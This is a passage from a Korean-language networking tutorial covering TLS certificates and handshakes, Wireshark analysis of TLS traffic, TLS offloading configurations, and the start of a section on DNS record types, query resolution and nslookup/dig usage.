<VirtualHost *:443>
    ServerName www.example.com

    SSLEngine on
    SSLCertificateFile /etc/apache2/ssl/server.crt
    SSLCertificateKeyFile /etc/apache2/ssl/server.key
    SSLCertificateChainFile /etc/apache2/ssl/intermediate.crt
</VirtualHost>
```

---

### Let's Encrypt (무료 인증서)

**특징**:
- **완전 무료**
- **자동화** (Certbot)
- 90일 유효 (자동 갱신)
- DV 인증서만 발급

**Certbot 사용**:

**설치**:
```bash
# Ubuntu/Debian
sudo apt-get install certbot python3-certbot-nginx

# CentOS/RHEL
sudo yum install certbot python3-certbot-nginx
```

**인증서 발급 (Nginx)**:
```bash
sudo certbot --nginx -d www.example.com -d example.com
```

**자동 갱신 설정**:
```bash
# Cron 작업 추가
sudo crontab -e

# 매일 2번 갱신 확인
0 0,12 * * * certbot renew --quiet
```

---

## 🤝 TLS Handshake 프로세스

### TLS 1.2 Handshake (Full)

**단계별 상세**:

```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 서버

    Note over Client,Server: 1. TCP 3-Way Handshake
    Client->>Server: SYN
    Server->>Client: SYN+ACK
    Client->>Server: ACK

    Note over Client,Server: 2. TLS Handshake 시작
    Client->>Server: ① ClientHello<br/>[지원 암호화 스위트, 랜덤 값]

    Server->>Client: ② ServerHello<br/>[선택 암호화 스위트, 랜덤 값]
    Server->>Client: ③ Certificate<br/>[서버 인증서]
    Server->>Client: ④ ServerKeyExchange<br/>[키 교환 파라미터]
    Server->>Client: ⑤ ServerHelloDone

    Note over Client: 인증서 검증

    Client->>Server: ⑥ ClientKeyExchange<br/>[Pre-Master Secret]
    Client->>Server: ⑦ ChangeCipherSpec
    Client->>Server: ⑧ Finished<br/>[암호화된 Handshake 검증]

    Server->>Client: ⑨ ChangeCipherSpec
    Server->>Client: ⑩ Finished<br/>[암호화된 Handshake 검증]

    Note over Client,Server: ✅ TLS 연결 수립 완료
    Client->>Server: Application Data (HTTP Request)
    Server->>Client: Application Data (HTTP Response)
```

**상세 단계**:

#### ① ClientHello

**클라이언트 → 서버**:
```
ClientHello {
    Version: TLS 1.2
    Random: [32바이트 랜덤 값]
    Session ID: [이전 세션 재사용 시]
    Cipher Suites: [
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        ...
    ]
    Compression Methods: null
    Extensions: [
        server_name: www.example.com (SNI)
        supported_groups: P-256, P-384
        signature_algorithms: RSA-PSS-SHA256, ECDSA-SHA256
    ]
}
```

**포함 내용**:
- 지원하는 TLS 버전
- 클라이언트 랜덤 값 (나중에 키 생성에 사용)
- 지원하는 암호화 스위트 목록
- SNI (Server Name Indication): 여러 도메인 호스팅 시 필요
- 확장 기능

#### ② ServerHello

**서버 → 클라이언트**:
```
ServerHello {
    Version: TLS 1.2
    Random: [32바이트 랜덤 값]
    Session ID: [세션 재사용 ID]
    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    Compression Method: null
}
```

**포함 내용**:
- 선택한 TLS 버전
- 서버 랜덤 값
- 선택한 암호화 스위트

#### ③ Certificate

**서버 → 클라이언트**:
```
Certificate {
    Certificate Chain: [
        서버 인증서,
        중간 CA 인증서,
        (Root CA는 클라이언트가 이미 보유)
    ]
}
```

**클라이언트 검증**:
1. 인증서 체인 검증
2. 인증서 유효 기간 확인
3. 도메인 이름 일치 확인
4. CRL/OCSP로 폐기 여부 확인

#### ④ ServerKeyExchange

**서버 → 클라이언트**:
```
ServerKeyExchange {
    ECDH Public Key: [서버의 임시 공개키]
    Signature: [서버 개인키로 서명]
}
```

**목적**:
- DHE/ECDHE 키 교환을 위한 파라미터 전송
- PFS (Perfect Forward Secrecy) 제공

#### ⑤ ServerHelloDone

**서버 → 클라이언트**:
```
ServerHelloDone {}
```
→ "내 차례 끝!"

#### ⑥ ClientKeyExchange

**클라이언트 → 서버**:
```
ClientKeyExchange {
    ECDH Public Key: [클라이언트의 임시 공개키]
}
```

**Pre-Master Secret 생성**:
```
클라이언트: 서버 공개키 + 자신의 개인키 → Pre-Master Secret
서버: 클라이언트 공개키 + 자신의 개인키 → Pre-Master Secret
```
→ 양쪽 모두 동일한 Pre-Master Secret 획득

**Master Secret 생성**:
```
Master Secret = PRF(
    Pre-Master Secret,
    "master secret",
    ClientHello.random + ServerHello.random
)
```

**세션 키 생성**:
```
Key Block = PRF(Master Secret, "key expansion", ...)

세션 키 추출:
- Client Write MAC Key
- Server Write MAC Key
- Client Write Encryption Key
- Server Write Encryption Key
- Client Write IV
- Server Write IV
```

#### ⑦ ChangeCipherSpec

**클라이언트 → 서버**:
```
ChangeCipherSpec {}
```
→ "이제부터 암호화 시작!"

#### ⑧ Finished (클라이언트)

**클라이언트 → 서버**:
```
Finished {
    Verify Data: [전체 Handshake 메시지의 해시, 암호화됨]
}
```
→ 첫 번째 암호화된 메시지

#### ⑨ ChangeCipherSpec (서버)

**서버 → 클라이언트**:
```
ChangeCipherSpec {}
```

#### ⑩ Finished (서버)

**서버 → 클라이언트**:
```
Finished {
    Verify Data: [전체 Handshake 메시지의 해시, 암호화됨]
}
```

**✅ Handshake 완료!**

---

### TLS 1.3 Handshake (간소화)

**TLS 1.3 개선사항**:
- **1-RTT**: Handshake 1회 왕복으로 완료
- **0-RTT**: 재연결 시 즉시 데이터 전송
- **더 강력한 보안**: 취약한 알고리즘 제거

**동작**:

```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 서버

    Note over Client,Server: TCP 3-Way Handshake (생략)

    Client->>Server: ClientHello<br/>[암호화 스위트, 키 공유 시작!]

    Note over Server: 키 계산 완료!

    Server->>Client: ServerHello<br/>[선택 암호화, 키 공유 완료]
    Server->>Client: {EncryptedExtensions}<br/>{Certificate}<br/>{CertificateVerify}<br/>{Finished}

    Note over Client,Server: ✅ 이미 암호화 시작!

    Client->>Server: {Finished}
    Client->>Server: Application Data
    Server->>Client: Application Data
```

**주요 변경**:

**1. 키 공유 미리 전송**:
```
ClientHello {
    ...
    Key Share: [
        (P-256, 공개키),
        (X25519, 공개키)
    ]
}
```
→ 서버가 즉시 키 계산 가능!

**2. 인증서 암호화**:
- TLS 1.2: 인증서 **평문** 전송
- TLS 1.3: 인증서 **암호화** 전송
→ 프라이버시 향상

**3. 0-RTT (재연결)**:
```
클라이언트: ClientHello + Pre-Shared Key + HTTP Request (동시!)
서버: 즉시 HTTP Response
```

**0-RTT 주의사항**:
- **Replay 공격 취약**: 중간자가 요청 재전송 가능
- **Idempotent 요청만**: GET 요청만 사용 권장

---

## 🔍 Wireshark TLS 분석 실습

### 실습 환경 구성

**목표**: dictionary.cambridge.org 접속 시 TLS Handshake 분석

**사전 준비**:
1. Wireshark 실행
2. 캡처 인터페이스 선택
3. 브라우저 준비

---

### 실습 Step 1: 패킷 캡처

**1-1. 캡처 시작**:
```
1. Wireshark에서 Wi-Fi 또는 Ethernet 인터페이스 선택
2. Start Capture (파란색 Shark Fin 버튼)
```

**1-2. 도메인 IP 확인**:
```bash
nslookup dictionary.cambridge.org
```

**예상 결과**:
```
Name:    dictionary.cambridge.org
Addresses:  151.101.2.132
           151.101.66.132
```

**1-3. 브라우저 접속**:
```
https://dictionary.cambridge.org
```

**1-4. 캡처 중지**:
```
Stop Capture (빨간색 Stop 버튼)
```

---

### 실습 Step 2: TLS Handshake 필터링

**필터 적용**:
```
ip.addr == 151.101.2.132 && tls.handshake
```

**또는**:
```
ip.addr == 151.101.2.132 && ssl.handshake
```

**예상 결과**:
```
No.  Time      Source          Destination     Protocol  Info
1    0.000000  192.168.1.100   151.101.2.132   TLSv1     Client Hello
2    0.045123  151.101.2.132   192.168.1.100   TLSv1.2   Server Hello, Certificate, Server Key Exchange, Server Hello Done
3    0.045890  192.168.1.100   151.101.2.132   TLSv1.2   Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
4    0.091234  151.101.2.132   192.168.1.100   TLSv1.2   Change Cipher Spec, Encrypted Handshake Message
```

---

### 실습 Step 3: Client Hello 분석

**패킷 선택**: 첫 번째 "Client Hello" 패킷 클릭

**상세 정보**:
```
Secure Sockets Layer
    TLSv1.2 Record Layer: Handshake Protocol: Client Hello
        Content Type: Handshake (22)
        Version: TLS 1.0 (0x0301)
        Length: 512
        Handshake Protocol: Client Hello
            Handshake Type: Client Hello (1)
            Length: 508
            Version: TLS 1.2 (0x0303)
            Random: 64a1b2c3... [32 bytes]
            Session ID Length: 0
            Cipher Suites Length: 42
            Cipher Suites (21 suites)
                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)
                Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)
                Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)
                ...
            Compression Methods Length: 1
            Compression Methods (1 method)
                Compression Method: null (0)
            Extensions Length: 425
            Extension: server_name (len=29)
                Server Name Indication extension
                    Server Name: dictionary.cambridge.org
            Extension: supported_groups (len=10)
                Supported Groups (5 groups)
                    Supported Group: x25519 (0x001d)
                    Supported Group: secp256r1 (0x0017)
                    Supported Group: secp384r1 (0x0018)
            Extension: signature_algorithms (len=24)
                Signature Algorithms (12 algorithms)
                    Signature Algorithm: rsa_pss_rsae_sha256 (0x0804)
                    Signature Algorithm: ecdsa_secp256r1_sha256 (0x0403)
                    ...
```

**주요 필드 설명**:

**Version**: TLS 1.2 (0x0303)
- 클라이언트가 지원하는 최고 버전

**Random**: 32바이트 랜덤 값
- 나중에 Master Secret 생성에 사용
- Replay 공격 방지

**Cipher Suites**: 지원하는 암호화 스위트 목록
- 우선순위 순서
- 예: `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
  - 키 교환: ECDHE
  - 인증: RSA
  - 암호화: AES-128-GCM
  - 해시: SHA256

**Extension - server_name (SNI)**:
- 목적지 도메인 명시
- 가상 호스팅 지원
- **주의**: **평문 전송** (TLS 1.2)

**Extension - supported_groups**:
- 지원하는 타원 곡선
- x25519, secp256r1, secp384r1

---

### 실습 Step 4: Server Hello & Certificate 분석

**패킷 선택**: 두 번째 "Server Hello" 패킷 클릭

**Server Hello**:
```
Handshake Protocol: Server Hello
    Version: TLS 1.2 (0x0303)
    Random: 9f8e7d6c... [32 bytes]
    Session ID: a1b2c3d4... [32 bytes]
    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)
    Compression Method: null (0)
    Extensions:
        Extension: renegotiation_info
        Extension: supported_versions (TLS 1.2)
```

**선택된 Cipher Suite 분석**:
```
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
  ①     ②   ③      ④       ⑤

① 키 교환: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)
② 인증: RSA (서버 인증서)
③ 암호화 알고리즘: AES-128
④ 암호화 모드: GCM (Galois/Counter Mode)
⑤ 해시 함수: SHA-256
```

**Certificate**:
```
Handshake Protocol: Certificate
    Certificates Length: 3924
    Certificates (3924 bytes)
        Certificate Length: 1876
        Certificate: 308207...
            signedCertificate
                version: v3 (2)
                serialNumber: 0x04000000000...
                signature (algorithm)
                    Algorithm: sha256WithRSAEncryption
                issuer
                    countryName: US
                    organizationName: DigiCert Inc
                    commonName: DigiCert SHA2 Secure Server CA
                validity
                    notBefore: 2024-01-01 00:00:00 (UTC)
                    notAfter: 2025-12-31 23:59:59 (UTC)
                subject
                    countryName: GB
                    localityName: Cambridge
                    organizationName: Cambridge University Press
                    commonName: *.cambridge.org
                subjectPublicKeyInfo
                    algorithm (id)
                        Algorithm: rsaEncryption
                    subjectPublicKey: 3082010a0282...
                        modulus: 00c90fa2...
                        publicExponent: 65537
                extensions
                    Extension: subjectAltName
                        dNSName: *.cambridge.org
                        dNSName: cambridge.org
                    Extension: keyUsage: critical
                        0100000010000000 (Digital Signature, Key Encipherment)
                    Extension: extKeyUsage
                        serverAuth (TLS Web Server Authentication)
```

**인증서 검증 (Wireshark)**:
```
우클릭 → Copy → Bytes (Printable Text Only)
→ 텍스트 파일로 저장 (certificate.txt)

# OpenSSL로 인증서 파싱
openssl x509 -in certificate.txt -text -noout
```

---

### 실습 Step 5: 암호화된 Application Data

**필터 적용**:
```
ip.addr == 151.101.2.132 && tls.app_data
```

**예상 결과**:
```
Secure Sockets Layer
    TLSv1.2 Record Layer: Application Data Protocol
        Content Type: Application Data (23)
        Version: TLS 1.2 (0x0303)
        Length: 1432
        Encrypted Application Data: 17030300598a7f2e...
```

**암호화된 데이터**:
- HTTP 요청/응답이 **완전히 암호화됨**
- Wireshark로 내용 확인 **불가능**
- **서버 개인키 필요** (실무에서는 불가능)

---

### TLS 복호화 (테스트 환경 전용)

**주의**: 프로덕션 환경에서는 **절대 사용 금지**

**방법 1: 서버 개인키 사용**:
```
Wireshark → Edit → Preferences → Protocols → TLS
→ RSA keys list:
   IP Address: 151.101.2.132
   Port: 443
   Protocol: http
   Key File: /path/to/private.key
```

**방법 2: SSLKEYLOGFILE (브라우저)**:
```bash
# Windows 환경 변수 설정
set SSLKEYLOGFILE=C:\ssl_keys.log

# Chrome/Firefox 실행
# 세션 키가 ssl_keys.log에 저장됨

# Wireshark 설정
Edit → Preferences → Protocols → TLS
→ (Pre)-Master-Secret log filename: C:\ssl_keys.log
```

**복호화 후**:
```
이제 Wireshark에서 HTTP 요청/응답 확인 가능!

GET /english/ HTTP/1.1
Host: dictionary.cambridge.org
User-Agent: Mozilla/5.0...
Accept: text/html...
```

---

## 🏢 SSL/TLS Offloading

### 개념

**문제 상황**:
```
[클라이언트] ━━ HTTPS ━━> [웹 서버]
                           ↓
                      CPU 과부하!
                      (TLS 암호화/복호화)
```

**해결책**: **로드 밸런서에서 TLS 처리**

```
[클라이언트] ━━ HTTPS ━━> [로드 밸런서] ━━ HTTP ━━> [웹 서버1]
                           (TLS 처리)     (평문)    [웹 서버2]
                                                    [웹 서버3]
```

**장점**:
- ✅ 웹 서버 CPU 부하 감소 (10~30%)
- ✅ 인증서 관리 중앙화 (1곳에만 설치)
- ✅ TLS 버전/암호화 스위트 통일 관리

**단점**:
- ❌ 로드 밸런서~서버 구간 평문 전송 (보안 위험)
- ❌ 로드 밸런서가 SPOF (Single Point of Failure)

---

### 구현 예제

**Nginx 로드 밸런서**:
```nginx
upstream backend {
    server 192.168.1.101:80;
    server 192.168.1.102:80;
    server 192.168.1.103:80;
}

server {
    listen 443 ssl http2;
    server_name www.example.com;

    # SSL/TLS 설정 (Offloading)
    ssl_certificate /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;

    # 백엔드로 HTTP 전달
    location / {
        proxy_pass http://backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

**HAProxy 로드 밸런서**:
```
frontend https_frontend
    bind *:443 ssl crt /etc/ssl/certs/combined.pem
    mode http
    default_backend web_backend

backend web_backend
    mode http
    balance roundrobin
    server web1 192.168.1.101:80 check
    server web2 192.168.1.102:80 check
    server web3 192.168.1.103:80 check
```

---

### End-to-End Encryption (권장)

**더 안전한 방식**: **로드 밸런서~서버도 HTTPS**

```
[클라이언트] ━━ HTTPS ━━> [로드 밸런서] ━━ HTTPS ━━> [웹 서버1]
                           (TLS 재암호화)   (TLS)     [웹 서버2]
```

**Nginx 예제**:
```nginx
upstream backend_https {
    server 192.168.1.101:443;
    server 192.168.1.102:443;
}

server {
    listen 443 ssl http2;
    server_name www.example.com;

    ssl_certificate /etc/nginx/ssl/public.crt;
    ssl_certificate_key /etc/nginx/ssl/private.key;

    location / {
        proxy_pass https://backend_https;
        proxy_ssl_verify on;
        proxy_ssl_trusted_certificate /etc/nginx/ssl/backend_ca.crt;
    }
}
```

---

## ✅ 학습 체크리스트

- [ ] SSL/TLS의 역사와 각 버전의 차이를 설명할 수 있다
- [ ] 대칭키와 비대칭키 암호화의 차이를 이해한다
- [ ] AES, RSA, ECDH의 용도를 설명할 수 있다
- [ ] 해시 함수의 특징과 주요 알고리즘을 안다
- [ ] MAC과 HMAC의 차이를 이해한다
- [ ] 디지털 인증서의 구조를 설명할 수 있다
- [ ] CA의 역할과 인증서 체인을 이해한다
- [ ] TLS 1.2와 1.3 Handshake의 차이를 알고 있다
- [ ] Wireshark로 TLS 트래픽을 분석할 수 있다
- [ ] SSL/TLS Offloading의 장단점을 설명할 수 있다

---

## 📋 핵심 요약

### TLS 버전 권장사항

| 버전 | 상태 | 권장 |
|:---:|:---:|:---:|
| SSL 1.0~3.0 | 폐기 | ❌ 사용 금지 |
| TLS 1.0~1.1 | 폐기 | ❌ 사용 금지 |
| TLS 1.2 | 현역 | ✅ 사용 가능 |
| TLS 1.3 | 최신 | ✅✅ 권장 |

### 암호화 알고리즘 권장사항

**대칭키 암호화**:
- ✅ AES-128-GCM (속도 우선)
- ✅ AES-256-GCM (보안 우선)
- ✅ ChaCha20-Poly1305 (모바일)
- ❌ 3DES (폐기)
- ❌ RC4 (폐기)

**비대칭키 암호화**:
- ✅ ECDHE (타원 곡선, 권장)
- ✅ RSA-2048 이상
- ❌ RSA-1024 (취약)

**해시 함수**:
- ✅ SHA-256 이상
- ❌ SHA-1 (폐기)
- ❌ MD5 (폐기)

---

## 🔐 보안 모범 사례

### 서버 설정 권장사항

**Nginx**:
```nginx
# TLS 버전
ssl_protocols TLSv1.2 TLSv1.3;

# 암호화 스위트
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers on;

# HSTS (HTTP Strict Transport Security)
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# OCSP Stapling
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/nginx/ssl/chain.pem;

# Session 설정
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
```

**Apache**:
```apache
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder on

Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

SSLUseStapling on
SSLStaplingCache "shmcb:logs/ssl_stapling(32768)"
```

---

### 인증서 관리

**1. 갱신 자동화**:
```bash
# Let's Encrypt Certbot 자동 갱신
0 0,12 * * * certbot renew --quiet
```

**2. 만료 모니터링**:
```bash
# 인증서 만료 확인 스크립트
openssl s_client -connect www.example.com:443 < /dev/null 2>/dev/null | \
    openssl x509 -noout -enddate
```

**3. 인증서 체인 확인**:
```bash
# SSL Labs 테스트
https://www.ssllabs.com/ssltest/

# 또는 CLI 도구
openssl s_client -connect www.example.com:443 -showcerts
```

---

다음 섹션에서는 **DNS, SSH, 그리고 네트워크 서비스**를 학습합니다.
# Section 5: DNS, SSH, 그리고 네트워크 서비스

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- DNS 아키텍처와 동작 원리
- 도메인 이름 구조 (FQDN)
- DNS 질의 방식 (재귀적 vs 반복적)
- DNS 레코드 타입 (A, AAAA, CNAME, MX, TXT)
- SSH 프로토콜 기초
- SSH vs Telnet 비교
- SSH 인증 방식 (패스워드, 공개키)
- SSH 포트 포워딩 (로컬, 리모트, 다이나믹)
- FTP Active vs Passive 모드
- 실무 보안 고려사항

---

## 🌐 DNS (Domain Name System)

### DNS란 무엇인가?

**정의**:
- **도메인 이름을 IP 주소로 변환**하는 시스템
- 인터넷의 "전화번호부"

**왜 필요한가?**:
```
사람: "www.google.com에 접속하고 싶어"
     ↓
     IP 주소를 기억하기 어려움 (142.250.207.100)
     ↓
DNS: "www.google.com = 142.250.207.100"
     ↓
컴퓨터: 142.250.207.100으로 접속
```

**비유**:
- 도메인 이름 = 사람 이름 ("홍길동")
- IP 주소 = 주민등록번호 ("123456-1234567")
- DNS = 주민센터 (이름 → 주민번호 조회)

---

### 도메인 이름 구조

#### FQDN (Fully Qualified Domain Name)

**전체 구조**:
```
www.example.com.
 ③    ②    ①   ⓪

⓪ Root Domain (생략됨)
① Top-Level Domain (TLD)
② Second-Level Domain (SLD)
③ Subdomain (또는 Hostname)
```

**계층 구조**:
```mermaid
graph TB
    A[. <br/>Root Domain] --> B[.com<br/>TLD]
    A --> C[.org<br/>TLD]
    A --> D[.kr<br/>TLD]

    B --> E[example.com<br/>SLD]
    B --> F[google.com<br/>SLD]

    E --> G[www.example.com<br/>Subdomain]
    E --> H[mail.example.com<br/>Subdomain]

    D --> I[.co.kr<br/>2nd-level TLD]
    I --> J[example.co.kr<br/>SLD]
```

---

#### 도메인 레벨별 설명

**Root Domain (.)**:
- 최상위 계층
- 전 세계에 **13개 Root DNS 서버** (a.root-servers.net ~ m.root-servers.net)
- 실제로는 애니캐스트로 수백 개 서버
- 보통 생략 (`www.example.com` = `www.example.com.`)

**TLD (Top-Level Domain)**:

**일반 TLD (gTLD)**:
| TLD | 의미 | 용도 |
|:---:|:---:|:---:|
| .com | Commercial | 상업용 (제한 없음) |
| .net | Network | 네트워크 관련 |
| .org | Organization | 비영리 단체 |
| .edu | Education | 교육 기관 (미국) |
| .gov | Government | 정부 기관 (미국) |
| .mil | Military | 군사 (미국) |

**국가 코드 TLD (ccTLD)**:
| TLD | 국가 | 예시 |
|:---:|:---:|:---:|
| .kr | 대한민국 | example.co.kr |
| .jp | 일본 | example.co.jp |
| .cn | 중국 | example.cn |
| .uk | 영국 | example.co.uk |
| .us | 미국 | example.us |

**새로운 gTLD** (2013년 이후):
- .app, .dev, .cloud, .security, .tech, .shop 등

**Second-Level Domain (SLD)**:
- 개인/기업이 등록하는 도메인
- 예: `example` in `example.com`
- **등록 비용 발생** (연간 1~5만 원)

**한국 특수 구조**:
```
example.co.kr
        ↓  ↓
       SLD TLD (2단계)

.co.kr: 기업
.or.kr: 단체
.go.kr: 정부
.ac.kr: 대학
.re.kr: 연구기관
```

**Subdomain (서브도메인)**:
- SLD 소유자가 자유롭게 생성
- 예: `www`, `mail`, `ftp`, `blog`
- **비용 없음** (자체 DNS 서버에서 관리)

---

### DNS 레코드 타입

#### A 레코드 (Address Record)
```
도메인 이름 → IPv4 주소
```

**예제**:
```
www.example.com.    IN  A  192.0.2.100
```

**의미**: `www.example.com`의 IPv4 주소는 `192.0.2.100`

**조회**:
```bash
nslookup www.example.com
# 또는
dig www.example.com A
```

---

#### AAAA 레코드 (IPv6 Address Record)
```
도메인 이름 → IPv6 주소
```

**예제**:
```
www.example.com.    IN  AAAA  2001:0db8:85a3::8a2e:0370:7334
```

**조회**:
```bash
nslookup -type=AAAA www.example.com
# 또는
dig www.example.com AAAA
```

---

#### CNAME 레코드 (Canonical Name)
```
별칭 → 실제 도메인 이름
```

**예제**:
```
www.example.com.     IN  CNAME  example.com.
blog.example.com.    IN  CNAME  hosting.tumblr.com.
```

**의미**:
- `www.example.com` 접속 → `example.com`으로 리디렉션
- `blog.example.com` 접속 → `hosting.tumblr.com`으로 리디렉션

**용도**:
- CDN 연결
- 서비스 별칭 생성
- 서버 이전 시 편리

**조회**:
```bash
nslookup -type=CNAME www.example.com
```

---

#### MX 레코드 (Mail Exchange)
```
도메인 → 메일 서버
```

**예제**:
```
example.com.    IN  MX  10 mail1.example.com.
example.com.    IN  MX  20 mail2.example.com.
```

**우선순위**:
- 숫자가 **낮을수록** 우선순위 높음
- `10` → 메인 메일 서버
- `20` → 백업 메일 서버

**조회**:
```bash
nslookup -type=MX example.com
# 또는
dig example.com MX
```

---

#### TXT 레코드 (Text Record)
```
도메인 → 임의의 텍스트
```

**용도**:
1. **SPF (Sender Policy Framework)**: 메일 발송 서버 인증
2. **DKIM (DomainKeys Identified Mail)**: 메일 서명
3. **DMARC**: 메일 인증 정책
4. **도메인 소유권 증명**: Google, AWS 등

**예제**:
```
example.com.  IN  TXT  "v=spf1 ip4:192.0.2.0/24 -all"
example.com.  IN  TXT  "google-site-verification=abc123xyz"
```

**조회**:
```bash
nslookup -type=TXT example.com
```

---

#### NS 레코드 (Name Server)
```
도메인 → DNS 서버
```

**예제**:
```
example.com.    IN  NS  ns1.example.com.
example.com.    IN  NS  ns2.example.com.
```

**의미**: `example.com` 도메인의 권한 있는 DNS 서버

**조회**:
```bash
nslookup -type=NS example.com
```

---

#### PTR 레코드 (Pointer Record)
```
IP 주소 → 도메인 이름 (역방향 조회)
```

**예제**:
```
100.2.0.192.in-addr.arpa.  IN  PTR  www.example.com.
```

**용도**:
- 메일 서버 인증 (스팸 방지)
- 로그 분석

**조회**:
```bash
nslookup 192.0.2.100
# 또는
dig -x 192.0.2.100
```

---

### DNS 질의 과정

#### 재귀적 질의 (Recursive Query)

**특징**:
- 클라이언트가 **Local DNS 서버에만 질의**
- Local DNS 서버가 **모든 작업 수행**
- 클라이언트는 **최종 결과만 수신**

**동작 과정**:

```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Local as Local DNS<br/>(ISP DNS)
    participant Root as Root DNS
    participant TLD as .com TLD DNS
    participant Auth as example.com<br/>권한 DNS

    Client->>Local: ① www.example.com의 IP 주소는?
    Note over Local: 캐시 확인 → 없음

    Local->>Root: ② .com DNS 서버는?
    Root->>Local: ③ .com은 192.5.6.30

    Local->>TLD: ④ example.com DNS 서버는?
    TLD->>Local: ⑤ example.com은 ns1.example.com

    Local->>Auth: ⑥ www.example.com의 IP는?
    Auth->>Local: ⑦ 192.0.2.100

    Local->>Client: ⑧ 192.0.2.100 (최종 답변)
```

**단계별 설명**:

① **클라이언트 → Local DNS**:
```
질의: www.example.com의 IP 주소는?
```

② **Local DNS → Root DNS**:
```
질의: .com을 관리하는 DNS 서버는?
```

③ **Root DNS → Local DNS**:
```
응답: .com TLD DNS = 192.5.6.30
```

④ **Local DNS → .com TLD DNS**:
```
질의: example.com을 관리하는 DNS 서버는?
```

⑤ **.com TLD DNS → Local DNS**:
```
응답: example.com 권한 DNS = ns1.example.com (198.51.100.1)
```

⑥ **Local DNS → example.com 권한 DNS**:
```
질의: www.example.com의 IP 주소는?
```

⑦ **example.com 권한 DNS → Local DNS**:
```
응답: 192.0.2.100
```

⑧ **Local DNS → 클라이언트**:
```
최종 응답: www.example.com = 192.0.2.100
```

**장점**:
- 클라이언트 부담 적음
- Local DNS가 캐싱 → 반복 질의 시 빠름

---

#### 반복적 질의 (Iterative Query)

**특징**:
- 각 DNS 서버가 **알고 있는 정보만 응답**
- **다음 DNS 서버 주소**를 알려줌
- 클라이언트(또는 Local DNS)가 **직접 추적**

**동작 과정**:
```
클라이언트 → Root DNS: www.example.com?
Root DNS → 클라이언트: 모르겠어. .com TLD DNS에 물어봐 (192.5.6.30)

클라이언트 → .com TLD DNS: www.example.com?
TLD DNS → 클라이언트: 모르겠어. ns1.example.com에 물어봐 (198.51.100.1)

클라이언트 → ns1.example.com: www.example.com?
ns1.example.com → 클라이언트: 192.0.2.100!
```

**실제로는**:
- 일반 사용자는 **재귀적 질의** 사용
- Local DNS 서버 간에는 **반복적 질의** 사용

---

### DNS 캐싱

**TTL (Time To Live)**:
```
www.example.com.  300  IN  A  192.0.2.100
                  ↑
                TTL (초)
```

**의미**:
- 이 레코드를 **300초(5분) 동안 캐시**
- 300초 후 재질의 필요

**캐싱 위치**:
1. **브라우저 캐시**: 수 분
2. **OS 캐시**: 수 분~수 시간
3. **Local DNS 서버**: TTL에 따름
4. **ISP DNS 서버**: TTL에 따름

**캐시 확인**:

**Windows**:
```cmd
ipconfig /displaydns
```

**macOS/Linux**:
```bash
# systemd-resolved 사용 시
sudo resolvectl statistics
```

**캐시 플러시**:

**Windows**:
```cmd
ipconfig /flushdns
```

**macOS**:
```bash
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
```

**Linux (systemd-resolved)**:
```bash
sudo systemd-resolve --flush-caches
```

---

### DNS 명령어 실습

#### nslookup (Windows/Linux/macOS)

**기본 조회**:
```bash
nslookup www.google.com
```

**출력 예시**:
```
Server:    168.126.63.1
Address:   168.126.63.1#53

Non-authoritative answer:
Name:   www.google.com
Address: 142.250.207.100
```

**특정 레코드 타입 조회**:
```bash
# MX 레코드
nslookup -type=MX gmail.com

# NS 레코드
nslookup -type=NS google.com

# TXT 레코드
nslookup -type=TXT google.com
```

**특정 DNS 서버 사용**:
```bash
nslookup www.google.com 8.8.8.8
```

**대화형 모드**:
```bash
nslookup
> server 8.8.8.8
> set type=A
> www.google.com
> exit
```

---

#### dig (Linux/macOS)

**기본 조회**:
```bash
dig www.google.com
```

**출력 예시**:
```
; <<>> DiG 9.16.1 <<>> www.google.com
;; QUESTION SECTION:
;www.google.com.            IN  A

;; ANSWER SECTION:
www.google.com.     300  IN  A  142.250.207.100

;; Query time: 25 msec
;; SERVER: 168.126.63.1#53(168.126.63.1)
;; WHEN: Mon Dec 02 09:00:00 KST 2024
;; MSG SIZE  rcvd: 59
```

**간단한 출력**:
```bash
dig www.google.com +short
# 142.250.207.100
```

**특정 레코드 타입**:
```bash
dig google.com MX
dig google.com NS
dig google.com TXT
```

**역방향 조회**:
```bash
dig -x 142.250.207.100
```

**전체 경로 추적**:
```bash
dig www.google.com +trace
```

**출력 (축약)**:
```
.           518400  IN  NS  a.root-servers.net.
com.        172800  IN  NS  a.gtld-servers.net.
google.com. 172800  IN  NS  ns1.google.com.
www.google.com. 300 IN  A   142.250.207.100
```

